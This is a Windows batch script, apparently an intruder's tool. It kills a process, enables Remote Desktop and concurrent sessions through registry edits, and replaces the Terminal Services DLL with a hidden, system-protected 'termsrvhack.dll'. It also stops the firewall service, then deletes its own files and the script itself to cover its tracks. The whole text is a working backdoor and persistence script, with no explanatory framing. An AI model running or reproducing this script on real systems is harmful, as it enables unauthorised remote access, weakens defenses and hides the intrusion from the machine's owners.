@echo off
@ntsd -c q -p 940
@REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon /v KeepRASConnections /t REG_SZ /d 1 /f
@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Licensing" "Core /v EnableConcurrentSessions /t REG_DWORD /d 00000001 /f
@REG ADD HKLM\SYSTEM\CurrentControlSet\Services\TermService\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\System32\termsrvhack.dll /f
@copy c:\termsrvhack.dll c:\windows\system32\termsrvhack.dll
@Attrib +H +S +R C:\windows\system32\termsrvhack.dll
@shutdown -a
@del c:\termsrvhack.dll
@del c:\3389.txt
@net stop sharedaccess
@net start dcomlaunch
@net start termservice
@del c:\2.bat